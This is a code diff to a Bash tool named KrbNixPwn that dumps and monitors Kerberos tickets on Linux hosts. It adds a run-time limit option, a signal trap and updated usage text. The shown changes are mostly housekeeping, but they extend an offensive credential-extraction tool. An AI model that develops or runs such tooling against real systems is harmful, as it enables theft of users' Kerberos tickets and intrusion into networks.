@@ -8,6 +8,8 @@
 OUTPUT_DIR="/tmp/krbnixpwn"
 MODE=""
 VERBOSE=0
+RUNFOR=0
+TIMER_PID=""
 
 # ---------------------- Utility Functions ----------------------
 
@@ -34,6 +36,9 @@ print_msg() {
         *)       echo "$msg" ;;
     esac
 }
+
+# Ensure we exit cleanly on signals and cleanup timer
+trap 'print_msg INFO "Termination signal received, shutting down"; if [ -n "${TIMER_PID:-}" ]; then kill "${TIMER_PID}" 2>/dev/null || true; fi; exit 0' SIGINT SIGTERM
 
 # Convert a hex string to binary output
 hex_to_bin() {
@@ -97,7 +102,7 @@ next_outfile() {
 # Print usage/help
 print_usage() {
     echo "KrbNixPwn - Kerberos ticket extraction tool"
-    echo "Usage: $0 [dump|monitor] [-o output_dir] [-verbose] [-h|--help]"
+    echo "Usage: $0 [dump|monitor] [-o output_dir] [-v|--verbose] [-r|--runfor seconds] [-p|--printout] [-h|--help]"
 }
 
 # Argument parsing
@@ -114,6 +119,10 @@ while [[ $# -gt 0 ]]; do
         -v|--verbose)
             VERBOSE=1
             shift 1
+        ;;
+        -r|--runfor)
+            RUNFOR="$2"
+            shift 2
         ;;
         -p|--printout)
             PRINTOUT=1
@@ -890,7 +899,18 @@ if [[ "$MODE" == "dump" ]]; then
     print_msg INFO "Dumping any kerberos material on the system"
     dump_all
     print_msg INFO "Dump complete"
-    elif [[ "$MODE" == "monitor" ]]; then
+elif [[ "$MODE" == "monitor" ]]; then
+    # Start runfor timer
+    if [ "${RUNFOR:-0}" -gt 0 ] 2>/dev/null; then
+        PGID=$(ps -o pgid= $$ | xargs)
+        (
+        sleep "$RUNFOR"
+        print_msg INFO "Timeout reached (${RUNFOR}s), exiting"
+        kill -TERM -"$PGID" 2>/dev/null || true
+    ) &
+    TIMER_PID=$!
+    print_msg INFO "runfor timer started (seconds=$RUNFOR)"
+    fi
     # List logged on users
     print_msg INFO "Searching for active sessions..."
     ps -eo uid= | sort -u | while read -r uid; do
@@ -913,4 +933,10 @@ if [[ "$MODE" == "dump" ]]; then
             fi
         fi
     done
+    # Stop the runfor timer
+    if [ -n "${TIMER_PID:-}" ]; then
+        kill "$TIMER_PID" 2>/dev/null || true
+        TIMER_PID=""
+        print_msg DEBUG "runfor timer stopped"
+    fi
 fi
